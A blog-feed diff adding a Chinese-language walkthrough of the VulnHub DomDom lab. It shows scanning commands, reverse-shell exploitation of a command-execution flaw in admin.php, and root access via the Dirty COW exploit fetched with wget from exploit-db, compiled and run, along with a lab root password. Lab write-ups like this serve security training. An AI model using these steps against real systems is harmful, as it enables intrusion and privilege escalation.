@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>vulnhub靶场DomDom</title>
+      <link href="/2022/11/16/toc-heading-16/"/>
+      <url>/2022/11/16/toc-heading-16/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr><p>你对PHP程序的理解程度如何？您对 Linux 错误配置有多熟悉？此图像将涵盖高级 Web 攻击、开箱即用的思维和最新的安全漏洞。</p><p>此靶场没有flag，获取到root权限即可。。。</p><hr><h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr><p><a href="https://www.vulnhub.com/entry/domdom-1,328/">https://www.vulnhub.com/entry/domdom-1,328/</a></p><hr><h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr><h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>netdiscover -r 192.168.1.0/24</code></p><p><img src="https://cdnjson.com/images/2022/11/16/143e6c67d2aa43da7.png" alt="探测存活主机"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -A -p 1-65535 192.168.1.106</code></p><p><img src="https://cdnjson.com/images/2022/11/16/2f2eb39d751aa4b4d.png" alt="端口扫描"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.1.106/</code></p><p><img src="https://cdnjson.com/images/2022/11/16/3ad02431eef49650d.png" alt="目录扫描"></p><hr><h3 id="0x003-命令执行漏洞"><a href="#0x003-命令执行漏洞" class="headerlink" title="0x003 命令执行漏洞"></a>0x003 命令执行漏洞</h3><hr><p>访问网站</p><p><img src="https://cdnjson.com/images/2022/11/16/42a8f178334931af5.png" alt="index.php"></p><p><img src="https://cdnjson.com/images/2022/11/16/50facb38fb3fcc13d.png" alt="admin.php"></p><p>使用burpsuite抓包测试，发现admin.php存在命令执行漏洞；因此可以执行一个反弹shell从而getshell</p><p><img src="https://cdnjson.com/images/2022/11/16/6f5197b65b2507978.png" alt="index.php"></p><p><img src="https://cdnjson.com/images/2022/11/16/7316d820ef88b46e2.png" alt="admin.php"></p><p><a href="https://www.revshells.com/">https://www.revshells.com/</a> 网站生成反弹shell</p><p><img src="https://cdnjson.com/images/2022/11/16/8db8fbad4169f24c0.png" alt="php_shell"></p><p>成功获取到shell</p><p><img src="https://cdnjson.com/images/2022/11/16/9721feaae6743b7a5.png" alt="shell"></p><p>切换交互模式：<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> </p><hr><h3 id="0x004-提权"><a href="#0x004-提权" class="headerlink" title="0x004 提权"></a>0x004 提权</h3><hr><h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p>uname -a 查看当前系统版本为 Linux ubuntu 4.4.0-21-generic</p><p>可以下载漏洞检测脚本进行检测 <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>检测到CVE-2016-5195，典型的脏牛提权漏洞</p><p><img src="https://cdnjson.com/images/2022/11/16/1047886455b0a4f920.png" alt="CVE-2016-5195"></p><p>下载利用exp：<code>wget https://www.exploit-db.com/download/40616</code></p><pre class=" language-bash"><code class="language-bash"><span class="token function">mv</span> 40616 exp.cgcc exp.c -o exp -pthread<span class="token function">chmod</span> +x exp</code></pre><blockquote><p>这里编译的时候可能会报错，不用管</p></blockquote><p><img src="https://cdnjson.com/images/2022/11/16/1181836ec9e9664771.png" alt="root"></p><h4 id="root密码登陆提权"><a href="#root密码登陆提权" class="headerlink" title="root密码登陆提权"></a>root密码登陆提权</h4><p>查找特殊权限的文件：<code>getcap -r / 2&gt;/dev/null</code></p><p><img src="https://cdnjson.com/images/2022/11/16/128f7671c0e50cb324.png" alt="getcap"></p><p>打包用户 domom 目录</p><pre class=" language-bash"><code class="language-bash"><span class="token function">tar</span> -cvf domom.tar /home/domom<span class="token function">tar</span> -xvf domom.tar<span class="token function">cat</span> README.md</code></pre><p>找到了root密码：<code>Mj7AGmPR-m&amp;Vf&gt;Ry{}LJRBS5nc+*V.#a</code></p><p><img src="https://cdnjson.com/images/2022/11/16/13f91a89e577cb232e.png" alt="root"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web Security </tag>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>vulnhub靶场Trollcave</title>
       <link href="/2022/11/15/toc-heading-15/"/>
       <url>/2022/11/15/toc-heading-15/</url>
